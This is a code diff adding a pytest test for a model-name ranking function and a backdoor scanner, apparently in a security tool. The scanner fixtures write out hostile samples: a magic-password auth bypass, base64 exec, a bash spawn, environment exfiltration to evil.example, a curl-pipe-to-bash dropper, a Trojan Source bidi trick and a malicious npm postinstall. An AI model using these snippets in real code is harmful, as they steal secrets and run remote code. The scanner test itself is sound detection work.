@@ -1134,3 +1134,69 @@ async def test_ai_runtime_config_api_local_and_byok_never_leaks_key():
             assert r_reset.json()["has_api_key"] is False
     finally:
         reset_runtime_override()
+
+
+@pytest.mark.asyncio
+async def test_backdoor_scanner_and_pro_first_gemini_ranking(tmp_path: Path):
+    from aegis.core.llm_runtime import rank_gemini_models
+    from aegis.scanners.backdoor_scanner import BackdoorScanner
+
+    # 1. Gemini Pro-first ranking: Pro (newest first) > Full Flash > Flash-Lite (emergency only)
+    ranked = rank_gemini_models(
+        [
+            "models/gemini-3.1-flash-lite",
+            "models/gemini-2.5-flash",
+            "models/gemini-2.5-pro",
+            "models/gemini-3.1-pro-preview",
+            "models/gemini-3-flash-preview",
+            "models/gemini-pro-latest",
+            "models/gemini-2.5-flash-image-preview",
+            "models/gemini-embedding-001",
+            "models/gemma-3-27b-it",
+        ]
+    )
+    assert ranked == [
+        "gemini-3.1-pro-preview",
+        "gemini-pro-latest",
+        "gemini-2.5-pro",
+        "gemini-3-flash-preview",
+        "gemini-2.5-flash",
+        "gemini-3.1-flash-lite",
+    ]
+
+    # 2. BackdoorScanner catches reverse shell, obfuscated exec, dropper, magic auth bypass,
+    #    env/SSH exfiltration, Trojan Source bidi override, and malicious package.json postinstall
+    (tmp_path / "implant.py").write_text(
+        "import base64, os, pty, requests\n"
+        "def hidden_login(password):\n"
+        "    if password == 's3cr3t_m4st3r': return True\n"
+        "def run_payload(blob):\n"
+        "    exec(base64.b64decode(blob))\n"
+        "    pty.spawn('/bin/bash')\n"
+        "def steal():\n"
+        "    requests.post('https://evil.example/c2', json=dict(os.environ))\n",
+        encoding="utf-8",
+    )
+    (tmp_path / "deploy.sh").write_text(
+        "#!/usr/bin/env bash\ncurl -fsSL https://evil.example/drop.sh | bash\n",
+        encoding="utf-8",
+    )
+    (tmp_path / "trojan.ts").write_text(
+        "const isAdmin = false;\n// \u202e if (isAdmin) { grantAll(); }\n",
+        encoding="utf-8",
+    )
+    (tmp_path / "package.json").write_text(
+        '{"name": "evil-pkg", "scripts": {"postinstall": "node -e \\"fetch(\'https://evil.example\', {body: JSON.stringify(process.env)})\\""}}\n',
+        encoding="utf-8",
+    )
+
+    findings = await BackdoorScanner().scan(tmp_path)
+    ids = {f.id for f in findings}
+    assert "backdoor-reverse-shell" in ids
+    assert "backdoor-obfuscated-exec" in ids
+    assert "backdoor-remote-dropper" in ids
+    assert "backdoor-auth-bypass-magic" in ids
+    assert "backdoor-env-ssh-exfil" in ids
+    assert "backdoor-trojan-source-bidi" in ids
+    assert "backdoor-npm-postinstall" in ids
+    assert all(f.severity == Severity.CRITICAL for f in findings)
